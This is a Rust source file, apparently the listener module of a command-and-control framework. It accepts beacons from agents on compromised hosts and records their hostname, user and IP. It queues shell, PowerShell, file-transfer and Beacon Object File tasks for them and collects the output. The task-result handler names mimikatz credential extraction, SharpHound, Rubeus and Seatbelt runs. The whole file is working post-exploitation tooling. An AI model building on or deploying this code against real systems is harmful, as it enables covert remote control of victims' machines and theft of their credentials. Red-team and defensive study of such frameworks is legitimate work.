// src/listener/mod.rs - Complete BOF Integration with Agent Task System (Fixed)
use std::io;
use std::sync::{Arc, Mutex};
use std::thread;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc::{channel, Sender};
use std::collections::HashMap;
use serde::{Serialize, Deserialize};
use tokio::runtime::Runtime;
use std::time::{SystemTime, UNIX_EPOCH};
use lazy_static::lazy_static;

use crate::models::agent::Agent;

// Simple BOF parser for command parsing
pub struct BofParser;

impl BofParser {
    /// Parse BOF command from input string
    pub fn parse_bof_command(command: &str) -> Option<(String, String)> {
        let parts: Vec<&str> = command.split_whitespace().collect();
        
        if parts.len() >= 2 && parts[0] == "bof" {
            let bof_name = parts[1].to_string();
            let args = if parts.len() > 2 {
                parts[2..].join(" ")
            } else {
                String::new()
            };
            
            Some((bof_name, args))
        } else {
            None
        }
    }
}

// Define messages for communication
enum ListenerMessage {
    Stop,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum ListenerType {
    Http,
    Https,
    Tcp,
    Smb,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ListenerConfig {
    pub listener_type: ListenerType,
    pub host: String,
    pub port: u16,
}

// Enhanced agent beacon data structure
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct BeaconData {
    pub id: String,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub arch: String,
    pub ip: String,
    pub pid: u32,
    pub current_directory: Option<String>,
}

// Enhanced task for agents with BOF support
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct AgentTask {
    pub id: String,
    pub command: String,
    pub task_type: TaskType,
    pub created_at: u64,
    pub is_bof_task: bool,
    pub bof_metadata: Option<BofTaskMetadata>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct BofTaskMetadata {
    pub bof_name: String,
    pub bof_args: String,
    pub execution_context: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum TaskType {
    Shell,
    PowerShell,
    Upload,
    Download,
    Kill,
    Sleep,
    Cd,
    Bof,           // New BOF task type
    InlineAssembly, // .NET assembly execution
    Custom,
}

// Enhanced task result with BOF support
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct TaskResult {
    pub id: String,
    pub command: String,
    pub result: String,
    pub success: bool,
    pub execution_time_ms: u64,
    pub current_directory: Option<String>,
    pub error_details: Option<String>,
    pub is_bof_result: bool,
    pub bof_metadata: Option<BofResultMetadata>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct BofResultMetadata {
    pub bof_name: String,
    pub exit_code: i32,
    pub output_size: usize,
    pub stderr_output: Option<String>,
}

// Global agent storage with enhanced BOF tracking
lazy_static! {
    static ref GLOBAL_AGENTS: Arc<Mutex<HashMap<String, Agent>>> = Arc::new(Mutex::new(HashMap::new()));
    static ref PENDING_TASKS: Arc<Mutex<HashMap<String, Vec<AgentTask>>>> = Arc::new(Mutex::new(HashMap::new()));
    static ref TASK_RESULTS: Arc<Mutex<HashMap<String, Vec<TaskResult>>>> = Arc::new(Mutex::new(HashMap::new()));
    static ref AGENT_DIRECTORIES: Arc<Mutex<HashMap<String, String>>> = Arc::new(Mutex::new(HashMap::new()));
    
    // Enhanced callback system for BOF results
    static ref RESULT_CALLBACK: Arc<Mutex<Option<Box<dyn Fn(String, String, String, String, bool) + Send + Sync>>>> = 
        Arc::new(Mutex::new(None));
    
    // BOF-specific tracking
    static ref BOF_EXECUTION_STATS: Arc<Mutex<HashMap<String, BofExecutionStats>>> = Arc::new(Mutex::new(HashMap::new()));
}

#[derive(Debug, Clone)]
pub struct BofExecutionStats {
    pub total_executions: u32,
    pub successful_executions: u32,
    pub failed_executions: u32,
    pub average_execution_time_ms: u64,
    pub last_execution: u64,
}

#[derive(Clone)]
pub struct Listener {
    pub config: ListenerConfig,
    running: Arc<AtomicBool>,
    tx: Arc<Mutex<Option<Sender<ListenerMessage>>>>,
}

impl Listener {
    pub fn new(config: ListenerConfig) -> Self {
        Listener {
            config,
            running: Arc::new(AtomicBool::new(false)),
            tx: Arc::new(Mutex::new(None)),
        }
    }
    
    pub fn start(&self) -> io::Result<()> {
        if self.running.load(Ordering::SeqCst) {
            return Ok(());
        }
        
        let (tx, rx) = channel::<ListenerMessage>();
        
        {
            let mut tx_guard = self.tx.lock().unwrap();
            *tx_guard = Some(tx);
        }
        
        self.running.store(true, Ordering::SeqCst);
        
        let config = self.config.clone();
        let running = self.running.clone();
        
        thread::spawn(move || {
            println!("🚀 Starting {:?} listener on {}:{}", config.listener_type, config.host, config.port);
            
            match config.listener_type {
                ListenerType::Http | ListenerType::Https => {
                    let rt = Runtime::new().unwrap();
                    rt.block_on(async {
                        if let Err(e) = start_http_server(&config, &running, &rx).await {
                            eprintln!("❌ HTTP server error: {}", e);
                        }
                    });
                },
                ListenerType::Tcp => {
                    start_tcp_server(&config, &running, &rx);
                },
                ListenerType::Smb => {
                    start_smb_server(&config, &running, &rx);
                }
            }
            
            println!("⏹ {:?} listener stopped on {}:{}", config.listener_type, config.host, config.port);
        });
        
        Ok(())
    }
    
    pub fn stop(&self) -> io::Result<()> {
        if !self.running.load(Ordering::SeqCst) {
            return Ok(());
        }
        
        self.running.store(false, Ordering::SeqCst);
        
        let tx_guard = self.tx.lock().unwrap();
        if let Some(tx) = tx_guard.as_ref() {
            let _ = tx.send(ListenerMessage::Stop);
        }
        
        Ok(())
    }
    
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }
}

impl Drop for Listener {
    fn drop(&mut self) {
        let _ = self.stop();
    }
}

// Enhanced callback system for BOF command results
pub fn set_result_callback<F>(callback: F) 
where 
    F: Fn(String, String, String, String, bool) + Send + Sync + 'static 
{
    let mut cb = RESULT_CALLBACK.lock().unwrap();
    *cb = Some(Box::new(callback));
    println!("📡 LISTENER: Enhanced result callback registered with BOF support");
}

pub fn notify_command_result(agent_id: String, task_id: String, command: String, output: String, success: bool) {
    // Check if this is a BOF command
    let is_bof_command = command.starts_with("bof ");
    
    if is_bof_command {
        println!("🔥 LISTENER: BOF command result detected for agent {}", agent_id);
        
        // Extract BOF name and update stats
        if let Some((bof_name, _)) = BofParser::parse_bof_command(&command) {
            update_bof_execution_stats(&bof_name, success, 0); // execution_time would be provided
            println!("📊 LISTENER: Updated BOF stats for '{}'", bof_name);
        }
    }
    
    let cb = RESULT_CALLBACK.lock().unwrap();
    if let Some(ref callback) = *cb {
        println!("📡 LISTENER: Executing callback for task {} (BOF: {})", task_id, is_bof_command);
        callback(agent_id, task_id, command, output, success);
    } else {
        println!("⚠️ LISTENER: No callback registered for result notification");
    }
}

// Enhanced public functions to manage agents and tasks with BOF support
pub fn get_all_agents() -> Vec<Agent> {
    GLOBAL_AGENTS.lock().unwrap().values().cloned().collect()
}

pub fn add_task_for_agent(agent_id: &str, command: String) -> String {
    let task_id = format!("task-{}-{}", agent_id, 
        SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs());
    
    // Enhanced task type detection with BOF support
    let (task_type, is_bof_task, bof_metadata) = determine_task_type(&command);
    
    let task = AgentTask {
        id: task_id.clone(),
        command: command.clone(),
        task_type,
        created_at: SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs(),
        is_bof_task,
        bof_metadata,
    };
    
    let mut pending = PENDING_TASKS.lock().unwrap();
    pending.entry(agent_id.to_string()).or_insert_with(Vec::new).push(task);
    
    if is_bof_task {
        println!("🔥 LISTENER: Added BOF task {} for agent {}", task_id, agent_id);
    } else {
        println!("📋 LISTENER: Added task {} for agent {}", task_id, agent_id);
    }
    
    task_id
}

fn determine_task_type(command: &str) -> (TaskType, bool, Option<BofTaskMetadata>) {
    let command_trim = command.trim();
    
    // Check for BOF commands
    if let Some((bof_name, args)) = BofParser::parse_bof_command(command) {
        let bof_metadata = BofTaskMetadata {
            bof_name: bof_name.clone(),
            bof_args: args,
            execution_context: "agent".to_string(),
        };
        
        // Determine specific BOF task type
        let task_type = match bof_name.as_str() {
            "inlineExecute-Assembly" => TaskType::InlineAssembly,
            _ => TaskType::Bof,
        };
        
        return (task_type, true, Some(bof_metadata));
    }
    
    // Traditional task type detection
    if command_trim.starts_with("cd ") {
        (TaskType::Cd, false, None)
    } else if command_trim.starts_with("powershell") || command_trim.starts_with("ps ") || command_trim.starts_with("Get-") {
        (TaskType::PowerShell, false, None)
    } else if command_trim == "exit" || command_trim == "kill" {
        (TaskType::Kill, false, None)
    } else if command_trim.starts_with("sleep ") {
        (TaskType::Sleep, false, None)
    } else if command_trim.starts_with("upload ") {
        (TaskType::Upload, false, None)
    } else if command_trim.starts_with("download ") {
        (TaskType::Download, false, None)
    } else {
        (TaskType::Shell, false, None)
    }
}

pub fn get_task_results(agent_id: &str) -> Vec<TaskResult> {
    TASK_RESULTS.lock().unwrap()
        .get(agent_id)
        .cloned()
        .unwrap_or_default()
}

pub fn get_agent_directory(agent_id: &str) -> String {
    AGENT_DIRECTORIES.lock().unwrap()
        .get(agent_id)
        .cloned()
        .unwrap_or_else(|| "C:\\".to_string())
}

// BOF-specific statistics and management (fixed function names)
pub fn get_bof_execution_stats(bof_name: &str) -> Option<BofExecutionStats> {
    BOF_EXECUTION_STATS.lock().unwrap().get(bof_name).cloned()
}

pub fn get_all_bof_stats() -> HashMap<String, BofExecutionStats> {
    BOF_EXECUTION_STATS.lock().unwrap().clone()
}

fn update_bof_execution_stats(bof_name: &str, success: bool, execution_time_ms: u64) {
    let mut stats = BOF_EXECUTION_STATS.lock().unwrap();
    
    let bof_stats = stats.entry(bof_name.to_string()).or_insert_with(|| BofExecutionStats {
        total_executions: 0,
        successful_executions: 0,
        failed_executions: 0,
        average_execution_time_ms: 0,
        last_execution: 0,
    });
    
    bof_stats.total_executions += 1;
    
    if success {
        bof_stats.successful_executions += 1;
    } else {
        bof_stats.failed_executions += 1;
    }
    
    // Update average execution time
    if execution_time_ms > 0 {
        let total_time = bof_stats.average_execution_time_ms * (bof_stats.total_executions - 1) as u64;
        bof_stats.average_execution_time_ms = (total_time + execution_time_ms) / bof_stats.total_executions as u64;
    }
    
    bof_stats.last_execution = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
}

// Enhanced HTTP server with BOF support
async fn start_http_server(
    config: &ListenerConfig, 
    running: &Arc<AtomicBool>,
    rx: &std::sync::mpsc::Receiver<ListenerMessage>
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    use std::net::SocketAddr;
    
    let addr: SocketAddr = format!("{}:{}", config.host, config.port)
        .parse()
        .map_err(|e| format!("Invalid address: {}", e))?;
    
    let listener = tokio::net::TcpListener::bind(&addr).await?;
    println!("🌐 Enhanced HTTP listener with BOF support bound to {}", addr);
    
    loop {
        if !running.load(Ordering::SeqCst) {
            break;
        }
        
        if let Ok(ListenerMessage::Stop) = rx.try_recv() {
            running.store(false, Ordering::SeqCst);
            break;
        }
        
        tokio::select! {
            result = listener.accept() => {
                match result {
                    Ok((stream, addr)) => {
                        println!("🔗 Connection from: {}", addr);
                        tokio::spawn(async move {
                            if let Err(e) = handle_enhanced_http_connection(stream, addr).await {
                                eprintln!("❌ Error handling connection: {}", e);
                            }
                        });
                    }
                    Err(e) => {
                        eprintln!("❌ Failed to accept connection: {}", e);
                    }
                }
            }
            _ = tokio::time::sleep(tokio::time::Duration::from_millis(100)) => {
                // Timeout to check running flag
            }
        }
    }
    
    Ok(())
}

// Enhanced HTTP connection handler with BOF support
async fn handle_enhanced_http_connection(
    mut stream: tokio::net::TcpStream,
    addr: std::net::SocketAddr
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    
    let mut buffer = [0; 16384]; // Increased buffer for BOF results
    
    match stream.read(&mut buffer).await {
        Ok(0) => return Ok(()),
        Ok(n) => {
            let request = String::from_utf8_lossy(&buffer[..n]);
            let first_line = request.lines().next().unwrap_or("");
            println!("📥 Enhanced HTTP request from {}: {}", addr, first_line);
            
            if request.contains("POST /beacon") {
                handle_enhanced_beacon_request(&mut stream, &request).await?;
            } else if request.contains("POST /task_result") {
                handle_enhanced_task_result(&mut stream, &request).await?;
            } else if request.contains("POST /bof_result") {
                handle_bof_specific_result(&mut stream, &request).await?;
            } else {
                // Send 404 for unknown endpoints
                let response = "HTTP/1.1 404 Not Found\r\nContent-Length: 9\r\n\r\nNot Found";
                stream.write_all(response.as_bytes()).await?;
            }
        }
        Err(e) => {
            eprintln!("❌ Error reading from connection: {}", e);
        }
    }
    
    Ok(())
}

// Enhanced beacon request handler with BOF task support
async fn handle_enhanced_beacon_request(
    stream: &mut tokio::net::TcpStream,
    request: &str
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    use tokio::io::AsyncWriteExt;
    
    if let Some(body_start) = request.find("\r\n\r\n") {
        let body = &request[body_start + 4..];
        
        match serde_json::from_str::<BeaconData>(body) {
            Ok(beacon) => {
                println!("🔴 Enhanced agent beacon: {} ({}@{})", beacon.id, beacon.username, beacon.hostname);
                
                // Update current directory if provided
                if let Some(ref current_dir) = beacon.current_directory {
                    let mut dirs = AGENT_DIRECTORIES.lock().unwrap();
                    dirs.insert(beacon.id.clone(), current_dir.clone());
                }
                
                // Update or create agent
                {
                    let mut agents = GLOBAL_AGENTS.lock().unwrap();
                    let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
                    
                    if let Some(agent) = agents.get_mut(&beacon.id) {
                        agent.last_seen = now;
                    } else {
                        let agent = Agent::new(
                            beacon.id.clone(),
                            beacon.hostname.clone(),
                            beacon.username.clone(),
                            beacon.os.clone(),
                            beacon.arch.clone(),
                            beacon.ip.clone()
                        );
                        agents.insert(beacon.id.clone(), agent);
                        println!("✅ New agent registered: {}", beacon.id);
                    }
                }
                
                // Get pending tasks for this agent (including BOF tasks)
                let tasks = {
                    let mut pending = PENDING_TASKS.lock().unwrap();
                    pending.remove(&beacon.id).unwrap_or_default()
                };
                
                // Log BOF tasks specifically
                let bof_tasks: Vec<_> = tasks.iter().filter(|t| t.is_bof_task).collect();
                if !bof_tasks.is_empty() {
                    println!("🔥 Sending {} BOF tasks to agent {}", bof_tasks.len(), beacon.id);
                    for bof_task in &bof_tasks {
                        if let Some(ref metadata) = bof_task.bof_metadata {
                            println!("  • BOF '{}' with args: '{}'", metadata.bof_name, metadata.bof_args);
                        }
                    }
                }
                
                // Send tasks as JSON response
                let tasks_json = serde_json::to_string(&tasks)?;
                let response = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{}",
                    tasks_json.len(),
                    tasks_json
                );
                stream.write_all(response.as_bytes()).await?;
                
                if !tasks.is_empty() {
                    println!("📤 Sent {} tasks ({} BOF) to agent {}", 
                        tasks.len(), bof_tasks.len(), beacon.id);
                }
            }
            Err(e) => {
                eprintln!("❌ Failed to parse beacon JSON: {}", e);
                let response = "HTTP/1.1 400 Bad Request\r\nContent-Length: 11\r\n\r\nBad Request";
                stream.write_all(response.as_bytes()).await?;
            }
        }
    } else {
        let response = "HTTP/1.1 400 Bad Request\r\nContent-Length: 11\r\n\r\nBad Request";
        stream.write_all(response.as_bytes()).await?;
    }
    
    Ok(())
}

// Enhanced task result handler with comprehensive BOF support
async fn handle_enhanced_task_result(
    stream: &mut tokio::net::TcpStream,
    request: &str
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    use tokio::io::AsyncWriteExt;
    
    if let Some(body_start) = request.find("\r\n\r\n") {
        let body = &request[body_start + 4..];
        
        match serde_json::from_str::<TaskResult>(body) {
            Ok(mut result) => {
                println!("📨 LISTENER: Received enhanced task result!");
                println!("   Task ID: {}", result.id);
                println!("   Command: {}", result.command);
                println!("   Success: {}", result.success);
                println!("   Output length: {}", result.result.len());
                
                // Enhanced BOF result processing
                if result.command.starts_with("bof ") {
                    println!("🔥 LISTENER: BOF command result detected");
                    
                    if let Some((bof_name, _)) = BofParser::parse_bof_command(&result.command) {
                        println!("🔥 LISTENER: BOF '{}' execution completed", bof_name);
                        
                        // Create BOF metadata for result
                        let bof_metadata = BofResultMetadata {
                            bof_name: bof_name.clone(),
                            exit_code: if result.success { 0 } else { 1 },
                            output_size: result.result.len(),
                            stderr_output: result.error_details.clone(),
                        };
                        
                        result.is_bof_result = true;
                        result.bof_metadata = Some(bof_metadata);
                        
                        // Update BOF execution statistics
                        update_bof_execution_stats(&bof_name, result.success, result.execution_time_ms);
                        
                        // Enhanced BOF result logging
                        match bof_name.as_str() {
                            "inlineExecute-Assembly" => {
                                if result.command.contains("Seatbelt.exe") {
                                    println!("🛡️ LISTENER: Seatbelt execution completed");
                                } else if result.command.contains("SharpHound.exe") {
                                    println!("🩸 LISTENER: BloodHound collection completed");
                                } else if result.command.contains("Rubeus.exe") {
                                    println!("🎫 LISTENER: Kerberos operation completed");
                                } else {
                                    println!("⚙️ LISTENER: .NET assembly execution completed");
                                }
                            },
                            "ps" => {
                                let process_count = result.result.lines().count();
                                println!("📋 LISTENER: Process enumeration completed ({} processes)", process_count);
                            },
                            "ls" => {
                                let file_count = result.result.lines().count();
                                println!("📁 LISTENER: Directory listing completed ({} items)", file_count);
                            },
                            "whoami" => {
                                println!("👤 LISTENER: User identification completed: {}", result.result.trim());
                            },
                            "mimikatz" => {
                                println!("🔑 LISTENER: Credential extraction completed");
                            },
                            _ => {
                                println!("🔥 LISTENER: Custom BOF '{}' completed", bof_name);
                            }
                        }
                        
                        // Show output preview for BOF results
                        if result.result.len() > 500 {
                            println!("   Output preview: {}...", &result.result[..500]);
                        } else if !result.result.trim().is_empty() {
                            println!("   Output: {}", result.result.trim());
                        }
                    }
                } else {
                    println!("📊 LISTENER: Regular command result processed");
                    result.is_bof_result = false;
                }
                
                // Update agent directory if this was a cd command
                if let Some(ref current_dir) = result.current_directory {
                    if let Some(agent_id) = extract_agent_id_from_task(&result.id) {
                        let mut dirs = AGENT_DIRECTORIES.lock().unwrap();
                        dirs.insert(agent_id, current_dir.clone());
                    }
                }
                
                // Store the result for GUI access
                if let Some(agent_id) = extract_agent_id_from_task(&result.id) {
                    println!("🔍 LISTENER: Extracted agent_id: {}", agent_id);
                    
                    {
                        let mut results = TASK_RESULTS.lock().unwrap();
                        results.entry(agent_id.clone()).or_insert_with(Vec::new).push(result.clone());
                        
                        // Keep only last 100 results per agent
                        if let Some(agent_results) = results.get_mut(&agent_id) {
                            if agent_results.len() > 100 {
                                agent_results.drain(0..agent_results.len() - 100);
                            }
                        }
                    }
                    
                    // Notify callback to send result to client
                    println!("📡 LISTENER: Notifying callback for result broadcast...");
                    notify_command_result(
                        agent_id,
                        result.id.clone(),
                        result.command.clone(),
                        result.result.clone(),
                        result.success
                    );
                    
                    println!("✅ LISTENER: Enhanced task result processed and callback notified");
                } else {
                    println!("❌ LISTENER: Could not extract agent_id from task_id: {}", result.id);
                }
                
                let response = "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK";
                stream.write_all(response.as_bytes()).await?;
            }
            Err(e) => {
                eprintln!("❌ LISTENER: Failed to parse task result JSON: {}", e);
                let response = "HTTP/1.1 400 Bad Request\r\nContent-Length: 11\r\n\r\nBad Request";
                stream.write_all(response.as_bytes()).await?;
            }
        }
    } else {
        let response = "HTTP/1.1 400 Bad Request\r\nContent-Length: 11\r\n\r\nBad Request";
        stream.write_all(response.as_bytes()).await?;
    }
    
    Ok(())
}

// New BOF-specific result handler for enhanced BOF communications
async fn handle_bof_specific_result(
    stream: &mut tokio::net::TcpStream,
    request: &str
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    use tokio::io::AsyncWriteExt;
    
    println!("🔥 LISTENER: Received BOF-specific result");
    
    if let Some(body_start) = request.find("\r\n\r\n") {
        let body = &request[body_start + 4..];
        
        // Parse enhanced BOF result format
        match serde_json::from_str::<BofSpecificResult>(body) {
            Ok(bof_result) => {
                println!("🔥 LISTENER: BOF-specific result parsed successfully");
                println!("   BOF Name: {}", bof_result.bof_name);
                println!("   Agent ID: {}", bof_result.agent_id);
                println!("   Execution Time: {}ms", bof_result.execution_time_ms);
                println!("   Exit Code: {}", bof_result.exit_code);
                
                // Convert to standard task result for compatibility
                let stdout_len = bof_result.stdout.len();
                let stderr_empty = bof_result.stderr.is_empty();
                let stderr_clone = bof_result.stderr.clone();
                
                let task_result = TaskResult {
                    id: bof_result.task_id.clone(),
                    command: format!("bof {} {}", bof_result.bof_name, bof_result.args),
                    result: bof_result.stdout,
                    success: bof_result.exit_code == 0,
                    execution_time_ms: bof_result.execution_time_ms,
                    current_directory: bof_result.current_directory,
                    error_details: if stderr_empty { None } else { Some(stderr_clone.clone()) },
                    is_bof_result: true,
                    bof_metadata: Some(BofResultMetadata {
                        bof_name: bof_result.bof_name.clone(),
                        exit_code: bof_result.exit_code,
                        output_size: stdout_len,
                        stderr_output: if stderr_empty { None } else { Some(stderr_clone) },
                    }),
                };
                
                // Process through standard result handling
                {
                    let mut results = TASK_RESULTS.lock().unwrap();
                    results.entry(bof_result.agent_id.clone()).or_insert_with(Vec::new).push(task_result.clone());
                }
                
                // Update BOF statistics
                update_bof_execution_stats(&bof_result.bof_name, bof_result.exit_code == 0, bof_result.execution_time_ms);
                
                // Notify callback
                notify_command_result(
                    bof_result.agent_id,
                    bof_result.task_id,
                    task_result.command,
                    task_result.result,
                    task_result.success
                );
                
                let response = "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK";
                stream.write_all(response.as_bytes()).await?;
            }
            Err(e) => {
                eprintln!("❌ LISTENER: Failed to parse BOF-specific result: {}", e);
                let response = "HTTP/1.1 400 Bad Request\r\nContent-Length: 11\r\n\r\nBad Request";
                stream.write_all(response.as_bytes()).await?;
            }
        }
    }
    
    Ok(())
}

// BOF-specific result structure for enhanced communications
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct BofSpecificResult {
    pub task_id: String,
    pub agent_id: String,
    pub bof_name: String,
    pub args: String,
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
    pub execution_time_ms: u64,
    pub current_directory: Option<String>,
    pub memory_usage_kb: Option<u64>,
    pub cpu_time_ms: Option<u64>,
}

fn extract_agent_id_from_task(task_id: &str) -> Option<String> {
    println!("🔍 LISTENER: Extracting agent_id from task_id: '{}'", task_id);
    
    let parts: Vec<&str> = task_id.split('-').collect();
    println!("🔍 LISTENER: Split parts: {:?}", parts);
    
    if parts.len() >= 3 && parts[0] == "task" {
        let agent_id = parts[1..parts.len()-1].join("-");
        println!("🔍 LISTENER: Extracted agent_id: '{}'", agent_id);
        Some(agent_id)
    } else {
        println!("❌ LISTENER: Invalid task_id format");
        None
    }
}

// Enhanced administrative functions for BOF management
pub fn get_bof_task_statistics() -> HashMap<String, u32> {
    let pending = PENDING_TASKS.lock().unwrap();
    let mut bof_task_counts = HashMap::new();
    
    for tasks in pending.values() {
        for task in tasks {
            if task.is_bof_task {
                if let Some(ref metadata) = task.bof_metadata {
                    *bof_task_counts.entry(metadata.bof_name.clone()).or_insert(0) += 1;
                }
            }
        }
    }
    
    bof_task_counts
}

pub fn clear_bof_statistics() {
    let mut stats = BOF_EXECUTION_STATS.lock().unwrap();
    stats.clear();
    println!("🧹 LISTENER: BOF execution statistics cleared");
}

pub fn get_agent_bof_history(agent_id: &str) -> Vec<TaskResult> {
    TASK_RESULTS.lock().unwrap()
        .get(agent_id)
        .unwrap_or(&Vec::new())
        .iter()
        .filter(|result| result.is_bof_result)
        .cloned()
        .collect()
}

// Placeholder implementations for TCP and SMB servers
fn start_tcp_server(
    _config: &ListenerConfig,
    running: &Arc<AtomicBool>,
    rx: &std::sync::mpsc::Receiver<ListenerMessage>
) {
    println!("🔧 TCP server with BOF support starting...");
    while running.load(Ordering::SeqCst) {
        if let Ok(ListenerMessage::Stop) = rx.try_recv() {
            running.store(false, Ordering::SeqCst);
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
    }
}

fn start_smb_server(
    _config: &ListenerConfig,
    running: &Arc<AtomicBool>,
    rx: &std::sync::mpsc::Receiver<ListenerMessage>
) {
    println!("🔧 SMB server with BOF support starting...");
    while running.load(Ordering::SeqCst) {
        if let Ok(ListenerMessage::Stop) = rx.try_recv() {
            running.store(false, Ordering::SeqCst);
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
    }
}

// Enhanced agent command processing for BOF integration
pub fn process_agent_command(agent_id: &str, command: &str) -> Option<String> {
    // Check if this is a BOF command
    if let Some((bof_name, args)) = BofParser::parse_bof_command(command) {
        println!("🔥 LISTENER: Processing BOF command '{}' for agent {}", bof_name, agent_id);
        
        // In a real implementation, this would:
        // 1. Validate the BOF exists
        // 2. Pack arguments appropriately
        // 3. Send BOF binary and args to agent
        // 4. Track execution
        
        Some(format!("BOF '{}' queued for execution with args: '{}'", bof_name, args))
    } else {
        // Regular command processing
        None
    }
}